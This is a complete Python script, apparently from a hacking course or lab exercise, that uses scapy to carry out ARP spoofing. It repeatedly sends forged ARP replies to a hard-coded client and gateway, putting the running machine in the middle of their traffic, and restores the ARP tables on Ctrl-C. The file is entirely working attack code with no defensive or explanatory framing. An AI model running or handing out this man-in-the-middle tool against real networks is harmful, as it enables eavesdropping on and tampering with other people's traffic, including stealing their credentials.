#!usr/bin/env python
import scapy.all as scapy
import time

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, verbose=False, timeout=1)[0]
    return answered_list[0][1].hwsrc
# scapy.ARP
# scapy.ls(scapy.ARP)
# packet = scapy.ARP(op=2, psdt="target_ip", hwdst="target_mac", hwsrc="router_mac", psrc="router_ip")
# packet = scapy.ARP(op=2, pdst="192.168.26.83", hwdst="08:00:27:e6:e5:59", psrc="192.168.26.115")
# print(packet.summary())
# print(packet.show())
# scapy.send(packet)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore_arp(client_ip, gateway_ip):
    client_mac = get_mac(client_ip)
    gateway_mac = get_mac(gateway_ip)
    packet = scapy.ARP(op=2, pdst=client_ip, hwdst=client_mac, psrc=gateway_ip, hwsrc=gateway_mac )
    scapy.send(packet, count=4, verbose=False)


client_ip = "192.168.24.83"
gateway_ip = "192.168.24.187"

try:
    packet_counter = 0
    while True:
        packet_counter = packet_counter + 2
        print("\r[+]Packet sent : " + str(packet_counter) + " press Ctrl C to quit  ", end="")
        spoof(client_ip, gateway_ip)
        spoof(gateway_ip, client_ip)
        time.sleep(2)
except KeyboardInterrupt:
    print("\ndetected control C ........ resetting arp tables and Quiting!!!!\n")
    restore_arp(client_ip, gateway_ip)
    restore_arp(gateway_ip, client_ip)

